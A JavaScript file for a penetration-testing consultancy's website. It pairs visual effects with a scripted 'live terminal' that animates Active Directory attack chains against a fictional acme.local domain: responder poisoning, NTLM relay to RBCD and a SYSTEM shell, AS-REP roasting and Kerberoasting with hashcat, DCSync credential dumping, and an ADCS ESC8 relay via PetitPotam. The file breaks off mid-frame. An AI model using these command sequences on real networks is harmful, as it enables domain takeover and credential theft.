// Kwang Security — premium consulting interactions
(function () {
  'use strict';

  // ── Aurora canvas (Stripe-style floating mesh gradient) ───────────────────
  function initAurora() {
    var canvas = document.createElement('canvas');
    canvas.id = 'aurora';
    canvas.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'z-index:0;pointer-events:none;';
    document.body.insertBefore(canvas, document.body.firstChild);

    var ctx = canvas.getContext('2d');
    var W = 0, H = 0;

    // Orbs: fixed orbital center + sine-wave offset
    var orbs = [
      { ox: 0.15, oy: 0.25, r: 0.65, color: [77, 124, 254],  a: 0,    sa: 0.00035, sb: 0.00028, pa: 0.14, pb: 0.10 },
      { ox: 0.85, oy: 0.15, r: 0.58, color: [139, 92, 246],  a: 2.1,  sa: 0.00025, sb: 0.00038, pa: 0.12, pb: 0.13 },
      { ox: 0.50, oy: 0.82, r: 0.60, color: [59, 130, 246],  a: 4.2,  sa: 0.00030, sb: 0.00022, pa: 0.16, pb: 0.11 },
      { ox: 0.72, oy: 0.55, r: 0.48, color: [167, 139, 250], a: 1.0,  sa: 0.00018, sb: 0.00032, pa: 0.10, pb: 0.14 },
      { ox: 0.30, oy: 0.70, r: 0.45, color: [99, 102, 241],  a: 3.3,  sa: 0.00022, sb: 0.00026, pa: 0.13, pb: 0.09 },
    ];

    function resize() {
      W = canvas.width  = window.innerWidth;
      H = canvas.height = window.innerHeight;
    }

    var t = 0;
    function draw() {
      ctx.clearRect(0, 0, W, H);
      t += 1;

      orbs.forEach(function (orb) {
        orb.a += orb.sa;
        var x = (orb.ox + Math.sin(orb.a)           * orb.pa) * W;
        var y = (orb.oy + Math.cos(orb.a * 1.3 + 1) * orb.pb) * H;
        var r = orb.r * Math.max(W, H) * 0.75;

        var g = ctx.createRadialGradient(x, y, 0, x, y, r);
        g.addColorStop(0,   'rgba(' + orb.color + ',0.20)');
        g.addColorStop(0.35,'rgba(' + orb.color + ',0.07)');
        g.addColorStop(1,   'rgba(' + orb.color + ',0)');

        ctx.fillStyle = g;
        ctx.fillRect(0, 0, W, H);
      });

      requestAnimationFrame(draw);
    }

    resize();
    draw();
    window.addEventListener('resize', resize, { passive: true });
  }

  // ── Noise texture overlay ────────────────────────────────────────────────
  function initNoise() {
    var c  = document.createElement('canvas');
    var cx = c.getContext('2d');
    c.width = c.height = 200;
    var id = cx.createImageData(200, 200);
    for (var i = 0; i < id.data.length; i += 4) {
      var v = (Math.random() * 255) | 0;
      id.data[i] = id.data[i+1] = id.data[i+2] = v;
      id.data[i+3] = 255;
    }
    cx.putImageData(id, 0, 0);

    var el = document.createElement('div');
    el.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background-image:url(' + c.toDataURL() + ');' +
      'background-repeat:repeat;' +
      'opacity:0.022;pointer-events:none;z-index:9996;';
    document.body.appendChild(el);
  }

  // ── Grid overlay ─────────────────────────────────────────────────────────
  function initGrid() {
    var el = document.createElement('div');
    el.id  = 'grid-overlay';
    document.body.insertBefore(el, document.body.children[1] || null);
  }

  // ── Masthead: darken + blur more on scroll ─────────────────────────────
  function initNav() {
    var nav = document.querySelector('.masthead');
    if (!nav) return;
    window.addEventListener('scroll', function () {
      nav.classList.toggle('scrolled', window.scrollY > 50);
    }, { passive: true });
  }

  // ── Scroll reveal with staggered children ────────────────────────────────
  function initReveal() {
    if (!window.IntersectionObserver) {
      document.querySelectorAll('.c-reveal').forEach(function (el) {
        el.classList.add('is-visible');
      });
      return;
    }

    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (!entry.isIntersecting) return;
        entry.target.classList.add('is-visible');
        io.unobserve(entry.target);
      });
    }, { threshold: 0.08, rootMargin: '0px 0px -20px 0px' });

    var groups = ['.c-services', '.c-sessions', '.c-posts', '.c-recog-list', '.c-hero__inner', '.c-metrics'];
    groups.forEach(function (sel) {
      document.querySelectorAll(sel).forEach(function (parent) {
        Array.from(parent.children).forEach(function (child, i) {
          if (!child.classList.contains('c-reveal')) return;
          child.style.transitionDelay = (i * 0.09) + 's';
        });
      });
    });

    document.querySelectorAll('.c-reveal').forEach(function (el) { io.observe(el); });
  }

  // ── Animated counters (easeOutExpo) ──────────────────────────────────────
  function initCounters() {
    var el = document.getElementById('c-metrics');
    if (!el || !window.IntersectionObserver) return;

    var fired = false;
    var io = new IntersectionObserver(function (entries) {
      if (!entries[0].isIntersecting || fired) return;
      fired = true; io.disconnect();

      el.querySelectorAll('.c-metric__num').forEach(function (num) {
        var target   = parseInt(num.getAttribute('data-target'), 10);
        var suffix   = num.getAttribute('data-suffix') || '';
        var start    = performance.now();
        var duration = 1800;
        (function tick(now) {
          var p = Math.min((now - start) / duration, 1);
          var e = p === 1 ? 1 : 1 - Math.pow(2, -10 * p);
          num.textContent = (Math.floor(e * target)) + suffix;
          if (p < 1) requestAnimationFrame(tick);
          else num.textContent = target + suffix;
        })(performance.now());
      });
    }, { threshold: 0.5 });
    io.observe(el);
  }

  // ── Magnetic buttons ─────────────────────────────────────────────────────
  function initMagnetic() {
    document.querySelectorAll('.c-btn').forEach(function (btn) {
      btn.addEventListener('mousemove', function (e) {
        var r = btn.getBoundingClientRect();
        var x = (e.clientX - r.left - r.width  / 2) * 0.25;
        var y = (e.clientY - r.top  - r.height / 2) * 0.25;
        btn.style.transform = 'translate(' + x + 'px,' + y + 'px) translateY(-2px)';
      });
      btn.addEventListener('mouseleave', function () {
        btn.style.transform = '';
      });
    });
  }

  // ── Smooth nav section highlight ─────────────────────────────────────────
  function initNavHighlight() {
    var links = document.querySelectorAll('.masthead__menu-item a');
    if (!links.length) return;
    var secs = [];
    links.forEach(function (link) {
      var href = link.getAttribute('href') || '';
      if (!href.includes('#')) return;
      var sec = document.getElementById(href.split('#')[1]);
      if (sec) secs.push({ link: link, sec: sec });
    });
    window.addEventListener('scroll', function () {
      var y = window.scrollY + 140;
      secs.forEach(function (item) {
        var active = y >= item.sec.offsetTop && y < item.sec.offsetTop + item.sec.offsetHeight;
        item.link.style.color = active ? 'var(--blue)' : '';
      });
    }, { passive: true });
  }

  // ── Process: connected timeline + tab detail (Ellis O-1 replica) ─────────
  function initProcessTabs() {
    var steps = document.querySelectorAll('.c-timeline__step');
    var tabs = document.querySelectorAll('.c-process-detail__tab');
    var panels = document.querySelectorAll('.c-process-detail__panel');
    var trackFill = document.querySelector('[data-track-fill]');
    var pmPhase = document.querySelector('[data-pm="phase"]');
    var pmProgress = document.querySelector('[data-pm="progress"]');
    var pmChecks = document.querySelector('[data-pm="checks"]');
    if (!steps.length && !tabs.length) return;

    var phaseNames = ['Scoping', 'Discovery', 'Exploitation', 'Reporting'];
    var phaseChecks = [14, 287, 62, 9];
    var autoTimer = null;
    var checksTimer = null;
    var autoEnabled = true;

    function activate(stepId, fromAuto) {
      var stepNum = parseInt(stepId, 10);

      steps.forEach(function (s) {
        var id = parseInt(s.getAttribute('data-step'), 10);
        s.classList.remove('is-active', 'is-complete');
        if (id < stepNum) s.classList.add('is-complete');
        if (id === stepNum) s.classList.add('is-active');
      });

      if (trackFill && steps.length > 1) {
        var pct = ((stepNum - 1) / (steps.length - 1)) * 100;
        trackFill.style.width = (pct * 0.75) + '%';
      }

      tabs.forEach(function (t) { t.classList.remove('is-active'); });
      panels.forEach(function (p) { p.classList.remove('is-active'); });
      var tab = document.querySelector('.c-process-detail__tab[data-step="' + stepId + '"]');
      var panel = document.querySelector('.c-process-detail__panel[data-panel="' + stepId + '"]');
      if (tab) tab.classList.add('is-active');
      if (panel) panel.classList.add('is-active');

      // Update live metrics bar
      if (pmPhase)    pmPhase.textContent = phaseNames[stepNum - 1];
      if (pmProgress) pmProgress.textContent = (stepNum * 25) + '%';
      if (pmChecks)   pmChecks.setAttribute('data-target', phaseChecks[stepNum - 1]);
      startChecksTick(phaseChecks[stepNum - 1]);

      // Reset auto-advance timer when user interacts
      if (!fromAuto) restartAuto();
    }

    function nextStep() {
      var active = document.querySelector('.c-timeline__step.is-active');
      var current = active ? parseInt(active.getAttribute('data-step'), 10) : 1;
      var next = (current % steps.length) + 1;
      activate(String(next), true);
    }

    function startAuto() {
      stopAuto();
      if (!autoEnabled) return;
      autoTimer = setInterval(nextStep, 5000);
    }
    function stopAuto() {
      if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
    }
    function restartAuto() { stopAuto(); startAuto(); }

    // Animated count up/drift on checks number
    function startChecksTick(target) {
      if (!pmChecks) return;
      if (checksTimer) clearInterval(checksTimer);
      var current = parseInt(pmChecks.textContent.replace(/,/g, ''), 10) || 0;
      var step = target > current ? Math.max(1, Math.round((target - current) / 20)) : -Math.max(1, Math.round((current - target) / 20));
      var countedTo = current;
      checksTimer = setInterval(function () {
        countedTo += step;
        if ((step > 0 && countedTo >= target) || (step < 0 && countedTo <= target)) {
          countedTo = target;
          clearInterval(checksTimer);
          // Then start a small jitter to simulate "live" scanning
          checksTimer = setInterval(function () {
            var jitter = Math.floor(Math.random() * 5) - 2;
            var val = Math.max(1, target + jitter);
            pmChecks.textContent = val.toLocaleString();
          }, 900);
        }
        pmChecks.textContent = countedTo.toLocaleString();
      }, 50);
    }

    steps.forEach(function (s) {
      s.addEventListener('click', function () { activate(s.getAttribute('data-step')); });
    });
    tabs.forEach(function (t) {
      t.addEventListener('click', function () { activate(t.getAttribute('data-step')); });
    });

    // Keyboard navigation on tabs
    tabs.forEach(function (tab, idx) {
      tab.addEventListener('keydown', function (e) {
        if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
        e.preventDefault();
        var next = e.key === 'ArrowRight'
          ? (idx + 1) % tabs.length
          : (idx - 1 + tabs.length) % tabs.length;
        tabs[next].focus();
        tabs[next].click();
      });
    });

    // Pause auto-advance when user hovers the section
    var section = document.getElementById('process');
    if (section) {
      section.addEventListener('mouseenter', stopAuto);
      section.addEventListener('mouseleave', startAuto);
    }

    // Start on step 1 + begin auto-cycling
    activate('1', true);
    startAuto();

    // Expose for the terminal to drive phase-in-sync without fighting the auto-cycler
    window.__process = {
      activate: function (stepId) { activate(String(stepId), true); },
      disableAuto: function () { autoEnabled = false; stopAuto(); },
      enableAuto: function () { autoEnabled = true; startAuto(); }
    };
  }

  // ── Live Engagement Feed — full AD kill-chain terminal loop ─────────────
  function initLiveTerminal() {
    var term = document.querySelector('[data-live-term]');
    if (!term) return;

    // Kali-style prompt (two-line)
    var P1 = '<span class="tl-prompt-host">┌──(kwangyun㉿kali)</span><span class="tl-prompt-at">-</span><span class="tl-prompt-tilde">[~/engagements/acme]</span>';
    var P2 = '<span class="tl-prompt-host">└─</span><span class="tl-prompt-dollar">$</span> ';

    // Engagement chapters — each loop picks one realistic attack path at random.
    // Every frame: { cmd: '<html>', out: ['<html>', ...], pace: 'scan'|'burst'|'crack'|'dwell', postWait: ms }
    var chapters = [
      // ── Chapter A: Responder → NTLM relay → RBCD → S4U2Proxy → SYSTEM ──
      {
        title: 'responder → relay → rbcd',
        objective: 'domain admin via RBCD',
        frames: [
          {
            cmd: '<span class="tl-cmd">cat</span> <span class="tl-str">/etc/resolv.conf</span>',
            out: [
              '<span class="tl-dim"># Generated by NetworkManager</span>',
              'search <span class="tl-domain">acme.local</span>',
              'nameserver <span class="tl-num">10.10.10.10</span>   <span class="tl-dim"># likely the DC</span>',
            ],
            pace: 'dwell', postWait: 700,
          },
          {
            cmd: '<span class="tl-cmd">nxc</span> ldap <span class="tl-domain">acme.local</span> <span class="tl-flag">-u</span> <span class="tl-str">\'\'</span> <span class="tl-flag">-p</span> <span class="tl-str">\'\'</span> <span class="tl-flag">--kdc</span> | <span class="tl-cmd">tee</span> dcs.txt',
            out: [
              '<span class="tl-dim">LDAP        10.10.10.10    389   DC01     [*] acme.local (name:DC01) (signing:True)</span>',
              '<span class="tl-ok">LDAP        10.10.10.10    389   DC01     [+] KDCs: dc01.acme.local, dc02.acme.local</span>',
              '<span class="tl-dim">LDAP        10.10.10.11    389   DC02     [*] acme.local (name:DC02) (signing:True)</span>',
            ],
            pace: 'scan', postWait: 700,
          },
          {
            cmd: '<span class="tl-cmd">nxc</span> smb <span class="tl-num">10.10.10.0/24</span> <span class="tl-flag">-u</span> <span class="tl-str">\'\'</span> <span class="tl-flag">-p</span> <span class="tl-str">\'\'</span> <span class="tl-flag">--gen-relay-list</span> smb_targets.txt',
            out: [
              '<span class="tl-dim">SMB       10.10.10.11    445   SRV-FS01     [*] Windows Server 2022 (signing:<span class="tl-warn">False</span>) (SMBv1:False)</span>',
              '<span class="tl-dim">SMB       10.10.10.12    445   SRV-APP01    [*] Windows Server 2019 (signing:<span class="tl-warn">False</span>) (SMBv1:False)</span>',
              '<span class="tl-dim">SMB       10.10.10.13    445   SRV-WEB01    [*] Windows Server 2019 (signing:<span class="tl-warn">False</span>) (SMBv1:False)</span>',
              '<span class="tl-dim">SMB       10.10.10.10    445   DC01         [*] Windows Server 2022 (signing:True)</span>',
              '<span class="tl-hi">[+] 14 relay targets written to smb_targets.txt</span>',
            ],
            pace: 'scan', postWait: 800,
          },
          {
            cmd: '<span class="tl-cmd">sudo responder</span> <span class="tl-flag">-I</span> <span class="tl-num">eth0</span> <span class="tl-flag">-wrdv</span>',
            out: [
              '<span class="tl-banner">                                         __</span>',
              '<span class="tl-banner">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span>',
              '<span class="tl-banner">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span>',
              '<span class="tl-banner">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span>',
              '<span class="tl-dim">                   |__|           v3.1.4.0</span>',
              '<span class="tl-dim">[+] Poisoners: LLMNR, NBT-NS, MDNS ON · SMB/HTTP/HTTPS OFF</span>',
              '<span class="tl-dim">[*] Listening for events on eth0...</span>',
              '<span class="tl-dim">[*] [MDNS] Poisoned answer sent to 10.10.10.42 for name wpad.acme.local</span>',
              '<span class="tl-ok">[SMB] NTLMv2-SSP Client   : 10.10.10.42</span>',
              '<span class="tl-ok">[SMB] NTLMv2-SSP Username : ACME\\<span class="tl-user">j.morgan</span></span>',
              '<span class="tl-ok">[SMB] NTLMv2-SSP Hash     : j.morgan::ACME:8f1e2c3d...[<span class="tl-dim">truncated</span>]...04a5b9</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">sudo impacket-ntlmrelayx</span> <span class="tl-flag">-tf</span> smb_targets.txt <span class="tl-flag">-smb2support</span> <span class="tl-flag">--no-http-server</span> <span class="tl-flag">-t</span> ldaps://dc01.<span class="tl-domain">acme.local</span> <span class="tl-flag">--add-computer</span> <span class="tl-user">rbcd01$</span>',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              '<span class="tl-dim">[*] Servers started, waiting for connections</span>',
              '<span class="tl-dim">[*] SMBD-Thread-4: Connection from ACME/j.morgan@10.10.10.42</span>',
              '<span class="tl-dim">[*] Authenticating against ldaps://dc01.acme.local as ACME/j.morgan SUCCEED</span>',
              '<span class="tl-ok">[+] Adding new computer account: <span class="tl-user">rbcd01$</span></span>',
              '<span class="tl-ok">[+] Added computer rbcd01$ with password: <span class="tl-pass">Y#k7@1pXp8sQr</span></span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">impacket-rbcd</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">j.morgan</span>:<span class="tl-str">\'CapturedNT\'</span> <span class="tl-flag">-action</span> <span class="tl-num">write</span> <span class="tl-flag">-delegate-from</span> <span class="tl-user">rbcd01$</span> <span class="tl-flag">-delegate-to</span> <span class="tl-user">SRV-APP01$</span>',
            out: [
              '<span class="tl-ok">[*] Delegation rights modified successfully</span>',
              '<span class="tl-ok">[*] rbcd01$ can now impersonate any user on SRV-APP01$</span>',
            ],
            pace: 'dwell', postWait: 700,
          },
          {
            cmd: '<span class="tl-cmd">impacket-getST</span> <span class="tl-flag">-spn</span> cifs/srv-app01.<span class="tl-domain">acme.local</span> <span class="tl-flag">-impersonate</span> <span class="tl-user">Administrator</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">rbcd01$</span>:<span class="tl-str">\'Y#k7@1pXp8sQr\'</span>',
            out: [
              '<span class="tl-dim">[*] Getting TGT for rbcd01$</span>',
              '<span class="tl-dim">[*] Impersonating Administrator</span>',
              '<span class="tl-dim">[*]   Requesting S4U2self</span>',
              '<span class="tl-dim">[*]   Requesting S4U2Proxy</span>',
              '<span class="tl-ok">[+] Saving ticket to Administrator@cifs_srv-app01.acme.local@ACME.LOCAL.ccache</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">export</span> KRB5CCNAME=Administrator@cifs_srv-app01.<span class="tl-domain">acme.local</span>.ccache <span class="tl-dim">&amp;&amp;</span> <span class="tl-cmd">impacket-psexec</span> <span class="tl-flag">-k</span> <span class="tl-flag">-no-pass</span> srv-app01.<span class="tl-domain">acme.local</span>',
            out: [
              '<span class="tl-dim">[*] Requesting shares on srv-app01.acme.local.....</span>',
              '<span class="tl-dim">[*] Found writable share ADMIN$</span>',
              '<span class="tl-dim">[*] Creating service ieXz on srv-app01.acme.local.....</span>',
              '<span class="tl-dim">[*] Opening SVCManager on srv-app01.acme.local.....</span>',
              '<span class="tl-ok">Microsoft Windows [Version 10.0.17763.5458]</span>',
              '<span class="tl-dim">(c) Microsoft Corporation. All rights reserved.</span>',
              '',
              'C:\\Windows\\system32&gt; <span class="tl-cmd">whoami</span>',
              '<span class="tl-hi">nt authority\\system</span>',
            ],
            pace: 'crack', postWait: 1200,
          },
        ],
        notes: [
          [{ text: 'DC resolved via resolv.conf · 10.10.10.10', cls: '' }],
          [{ text: 'KDCs enumerated · dc01 + dc02', cls: '' }],
          [{ text: '14 relay targets · SMB signing off', cls: 'flag' }],
          [{ text: 'NTLMv2 captured · ACME\\j.morgan', cls: 'ok' }],
          [{ text: 'machine account added · rbcd01$', cls: 'ok' }],
          [{ text: 'RBCD applied · rbcd01$ → SRV-APP01$', cls: 'flag' }],
          [{ text: 'S4U2Proxy ticket for Administrator issued', cls: 'ok' }],
          [{ text: 'SYSTEM shell on SRV-APP01 · game over', cls: 'hot' }],
        ],
      },

      // ── Chapter B: Kerbrute → AS-REP → Kerberoast → BloodHound → DCSync ──
      {
        title: 'kerbrute → as-rep → kerberoast → dcsync',
        objective: 'domain admin via dcsync',
        frames: [
          {
            cmd: '<span class="tl-cmd">nxc</span> smb <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-u</span> <span class="tl-str">\'\'</span> <span class="tl-flag">-p</span> <span class="tl-str">\'\'</span> <span class="tl-flag">--pass-pol</span>',
            out: [
              '<span class="tl-dim">SMB    10.10.10.10   445   DC01   [*] Windows Server 2022 (name:DC01)</span>',
              '<span class="tl-dim">SMB    10.10.10.10   445   DC01   Password Complexity: Disabled</span>',
              '<span class="tl-dim">SMB    10.10.10.10   445   DC01     Minimum password length: 7</span>',
              '<span class="tl-dim">SMB    10.10.10.10   445   DC01     Account lockout threshold: 0</span>',
              '<span class="tl-warn">SMB    10.10.10.10   445   DC01   [!] Lockout disabled — safe to spray</span>',
            ],
            pace: 'scan', postWait: 700,
          },
          {
            cmd: '<span class="tl-cmd">./kerbrute</span> userenum <span class="tl-flag">-d</span> <span class="tl-domain">acme.local</span> <span class="tl-flag">--dc</span> <span class="tl-num">10.10.10.10</span> <span class="tl-str">/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span>',
            out: [
              '<span class="tl-banner">    __             __               __       </span>',
              '<span class="tl-banner">   / /_____  _____/ /_  _______  __/ /____</span>',
              '<span class="tl-banner">  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\</span>',
              '<span class="tl-banner"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span>',
              '<span class="tl-banner">/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/</span>',
              '<span class="tl-ok">[+] VALID USERNAME:  administrator@acme.local</span>',
              '<span class="tl-ok">[+] VALID USERNAME:  j.morgan@acme.local</span>',
              '<span class="tl-ok">[+] VALID USERNAME:  <span class="tl-user">sarah.chen</span>@acme.local</span>',
              '<span class="tl-ok">[+] VALID USERNAME:  <span class="tl-user">svc_sql</span>@acme.local</span>',
              '<span class="tl-hi">[+] 487 valid usernames written to valid_users.txt</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">impacket-GetNPUsers</span> <span class="tl-flag">-usersfile</span> valid_users.txt <span class="tl-flag">-dc-ip</span> <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-request</span> <span class="tl-domain">acme.local</span>/',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              '<span class="tl-dim">[-] User administrator doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set</span>',
              '<span class="tl-dim">[-] User j.morgan doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set</span>',
              '<span class="tl-ok">$krb5asrep$23$<span class="tl-user">sarah.chen</span>@ACME.LOCAL:9d4e7a...[<span class="tl-dim">truncated</span>]...e42</span>',
            ],
            pace: 'scan', postWait: 800,
          },
          {
            cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">18200</span> asrep.hash <span class="tl-str">/usr/share/wordlists/rockyou.txt</span> <span class="tl-flag">-r</span> rules/best64.rule',
            out: [
              '<span class="tl-dim">hashcat (v6.2.6) starting</span>',
              '<span class="tl-dim">* Device #1: NVIDIA GeForce RTX 4090, 23960/24260 MB, 128MCU</span>',
              '<span class="tl-dim">Speed.#1.........: 9421.8 MH/s (41.2ms)</span>',
              '<span class="tl-ok">$krb5asrep$23$sarah.chen@ACME.LOCAL:...:<span class="tl-pass">Spring2024!</span></span>',
              '<span class="tl-ok">Status: Cracked   Time: 00:00:11   Recovered: 1/1</span>',
            ],
            pace: 'crack', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">impacket-GetUserSPNs</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">sarah.chen</span>:<span class="tl-str">\'Spring2024!\'</span> <span class="tl-flag">-dc-ip</span> <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-request</span>',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              'ServicePrincipalName       Name        MemberOf',
              '-------------------------  ----------  ----------------------------------------------',
              'MSSQLSvc/sql01.acme.local  <span class="tl-user">svc_sql</span>     CN=Domain Admins,CN=Users,DC=acme,DC=local',
              'HTTP/intranet.acme.local   <span class="tl-user">svc_web</span>     CN=Domain Users,CN=Users,DC=acme,DC=local',
              '',
              '<span class="tl-ok">$krb5tgs$23$*svc_sql$ACME$MSSQLSvc/sql01.acme.local*$...[<span class="tl-dim">redacted</span>]</span>',
            ],
            pace: 'scan', postWait: 800,
          },
          {
            cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">13100</span> tgs.hash <span class="tl-str">/usr/share/wordlists/rockyou.txt</span> <span class="tl-flag">-r</span> rules/best64.rule',
            out: [
              '<span class="tl-dim">Kerberos 5, etype 23, TGS-REP detected</span>',
              '<span class="tl-dim">Speed.#1.........: 6842.1 MH/s (38.8ms)</span>',
              '<span class="tl-ok">$krb5tgs$23$*svc_sql*...:<span class="tl-pass">Summer2024!</span></span>',
              '<span class="tl-ok">Status: Cracked   Time: 00:00:09   Recovered: 1/1</span>',
              '<span class="tl-hi">[*] svc_sql is a Domain Admin · pivoting to DC</span>',
            ],
            pace: 'crack', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">bloodhound-python</span> <span class="tl-flag">-u</span> <span class="tl-user">svc_sql</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Summer2024!\'</span> <span class="tl-flag">-d</span> <span class="tl-domain">acme.local</span> <span class="tl-flag">-c</span> <span class="tl-num">all</span> <span class="tl-flag">-ns</span> <span class="tl-num">10.10.10.10</span>',
            out: [
              '<span class="tl-dim">INFO: Found AD domain: acme.local</span>',
              '<span class="tl-dim">INFO: Connecting to LDAP server: dc01.acme.local</span>',
              '<span class="tl-dim">INFO: Collected 2,847 users, 412 computers, 183 groups</span>',
              '<span class="tl-dim">INFO: Collected 19 domain trusts, 1,204 ACLs</span>',
              '<span class="tl-ok">[*] Domain collection finished in 9.3s · 4 JSON files written</span>',
              '<span class="tl-hi">[*] Shortest path to Domain Admin: 2 edges via svc_sql → HasSession → DC01</span>',
            ],
            pace: 'scan', postWait: 800,
          },
          {
            cmd: '<span class="tl-cmd">impacket-secretsdump</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">svc_sql</span>:<span class="tl-str">\'Summer2024!\'</span>@<span class="tl-num">10.10.10.10</span> <span class="tl-flag">-just-dc</span>',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              '<span class="tl-dim">[*] Target system bootKey: 0x4a7f...</span>',
              '<span class="tl-dim">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>',
              '<span class="tl-ok">acme.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">d7e6...91a</span>:::</span>',
              '<span class="tl-ok">acme.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">8c31...fd4</span>:::</span>',
              '<span class="tl-dim">acme.local\\j.morgan:1103:aad3b435b51404eeaad3b435b51404ee:5f42...7c9:::</span>',
              '<span class="tl-dim">[*] Cleaning up...</span>',
              '<span class="tl-hi">[+] 2,847 credentials dumped · krbtgt compromised · Golden Ticket available</span>',
            ],
            pace: 'burst', postWait: 1100,
          },
        ],
        notes: [
          [{ text: 'password policy · min len 7 · lockout off', cls: 'flag' }],
          [{ text: 'kerbrute · 487 valid users enumerated', cls: '' }],
          [{ text: 'AS-REP · sarah.chen has PREAUTH off', cls: 'flag' }],
          [{ text: 'cracked: Spring2024! (11s, RTX 4090)', cls: 'ok' }],
          [{ text: 'kerberoast · svc_sql in Domain Admins', cls: 'flag' }],
          [{ text: 'cracked: Summer2024! · svc_sql → DA', cls: 'ok' }],
          [{ text: 'BloodHound · 2-edge path confirmed', cls: 'ok' }],
          [{ text: 'DCSync · krbtgt + 2,847 hashes dumped', cls: 'hot' }],
        ],
      },

      // ── Chapter C: ADCS ESC8 via PetitPotam coerce → DC cert → DCSync ──
      {
        title: 'adcs esc8 · petitpotam chain',
        objective: 'domain admin via ADCS ESC8',
        frames: [
          {
            cmd: '<span class="tl-cmd">nxc</span> smb <span class="tl-num">10.10.10.0/24</span> <span class="tl-flag">-u</span> <span class="tl-user">sarah.chen</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Spring2024!\'</span> <span class="tl-flag">-M</span> enum_ca',
            out: [
              '<span class="tl-dim">SMB       10.10.10.20    445   ADCS01   [*] Windows Server 2022 (name:ADCS01)</span>',
              '<span class="tl-ok">ENUM_CA                                [+] Active Directory Certificate Services installed</span>',
              '<span class="tl-dim">ENUM_CA                                [*] CA Name: acme-ADCS01-CA</span>',
              '<span class="tl-warn">ENUM_CA                                [!] Web Enrollment: http://adcs01.acme.local/certsrv</span>',
              '<span class="tl-dim">ENUM_CA                                [*] Templates: User, Machine, DomainController, SubCA (+38 more)</span>',
            ],
            pace: 'scan', postWait: 800,
          },
          {
            cmd: '<span class="tl-cmd">certipy</span> find <span class="tl-flag">-u</span> <span class="tl-user">sarah.chen</span>@<span class="tl-domain">acme.local</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Spring2024!\'</span> <span class="tl-flag">-dc-ip</span> <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-vulnerable</span> <span class="tl-flag">-stdout</span>',
            out: [
              '<span class="tl-dim">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>',
              '<span class="tl-dim">[*] Finding certificate authorities</span>',
              '<span class="tl-dim">[*] Found 1 certificate authority</span>',
              '<span class="tl-dim">[*] Found 42 certificate templates</span>',
              '<span class="tl-err">[!] Vulnerabilities</span>',
              '<span class="tl-err">    ESC8 : HTTP enrollment enabled · NTLM relay primitive</span>',
              '<span class="tl-hi">[!] acme-ADCS01-CA has no CA-level protections (http://adcs01.acme.local/certsrv/)</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-cmd">sudo impacket-ntlmrelayx</span> <span class="tl-flag">-t</span> http://adcs01.<span class="tl-domain">acme.local</span>/certsrv/certfnsh.asp <span class="tl-flag">--adcs</span> <span class="tl-flag">--template</span> DomainController <span class="tl-flag">-smb2support</span>',
            out: [
              '<span class="tl-dim">Impacket v0.12.0 - Copyright Fortra, LLC</span>',
              '<span class="tl-dim">[*] Protocol Client LDAP loaded..</span>',
              '<span class="tl-dim">[*] Running in relay mode to single host</span>',
              '<span class="tl-dim">[*] Servers started, waiting for connections</span>',
            ],
            pace: 'scan', postWait: 700,
          },
          {
            cmd: '<span class="tl-cmd">python3</span> PetitPotam.py <span class="tl-num">10.10.10.50</span> <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-pipe</span> all',
            out: [
              '<span class="tl-dim">Trying pipe lsarpc</span>',
              '<span class="tl-dim">[-] Connecting to ncacn_np:10.10.10.10[\\PIPE\\lsarpc]</span>',
              '<span class="tl-ok">[+] Connected!</span>',
              '<span class="tl-ok">[+] EfsRpcOpenFileRaw is NOT patched</span>',
              '<span class="tl-ok">[+] OK, EfsRpcEncryptFileSrv returned as expected: 1818</span>',
            ],
            pace: 'scan', postWait: 900,
          },
          {
            cmd: '<span class="tl-dim"># ... back in the ntlmrelayx window ...</span>',
            out: [
              '<span class="tl-dim">[*] SMBD-Thread-7: Connection from ACME/<span class="tl-user">DC01$</span>@10.10.10.10</span>',
